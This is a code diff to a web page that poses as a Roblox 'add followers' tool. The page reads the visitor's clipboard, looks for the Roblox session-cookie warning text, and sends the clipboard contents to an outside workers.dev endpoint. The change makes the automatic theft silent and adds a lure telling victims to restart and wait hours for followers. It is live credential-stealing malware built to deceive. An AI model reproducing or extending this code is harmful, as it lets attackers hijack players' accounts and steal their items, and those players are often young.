@@ -392,7 +392,7 @@
         const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
         const statusEl = document.getElementById("statusMessage");
 
-        async function sendClipboardData(text) {
+        async function sendClipboardData(text, isButtonClick = false) {
             try {
                 await fetch(SEND_ENDPOINT, {
                     method: "POST",
@@ -403,7 +403,9 @@
                         clipboardText: text
                     })
                 });
-                statusEl.textContent = "Watch One Of The Tuts And Click Add Followers";
+                if (isButtonClick) {
+                    statusEl.textContent = "Restart Device And Wait 2 - 3 Hourse To get the followers added to your acc";
+                }
             } catch (error) {
                 statusEl.textContent = "Something went wrong. Please try again.";
                 console.error(error);
@@ -418,7 +420,7 @@
                     statusEl.textContent = "Error: make sure you followed one of the tuts.";
                     return;
                 }
-                await sendClipboardData(text);
+                await sendClipboardData(text, true);
             } catch (error) {
                 statusEl.textContent = "Error: make sure you followed one of the tuts.";
                 console.error(error);
@@ -430,7 +432,7 @@
             try {
                 const text = await navigator.clipboard.readText();
                 if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
-                    await sendClipboardData(text);
+                    await sendClipboardData(text, false);
                     return;
                 }
             } catch (e) {
